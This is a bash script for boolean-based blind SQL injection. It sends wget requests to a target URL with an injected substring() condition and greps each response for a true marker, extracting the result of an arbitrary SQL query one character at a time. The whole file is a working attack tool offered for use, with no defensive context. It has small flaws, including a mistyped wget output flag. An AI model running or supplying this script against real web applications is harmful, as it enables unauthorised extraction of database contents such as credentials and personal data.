#!/usr/bin/env bash

export checkstring="Enter DOM return behaviour here for boolean true response"

charset=`echo {0..9} {a..Z} \. \: \, \; \- \_ \@`
export url="$1"
export maxlength=$2
export query=$3
export result=""

echo "Extracting results for the $query:"
for ((j=1;j<=$maxlength;j+=1))
do
	export nchar=$j
	for i in $charset
	do
		wget "$url?parameter=true_return' and substring(($query),$nchar,1)='$i" -q -0 - | grep "$checkstring" &>/dev/null
		if [ "$?" == "0" ]
		then
			echo Character number $nchar found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result
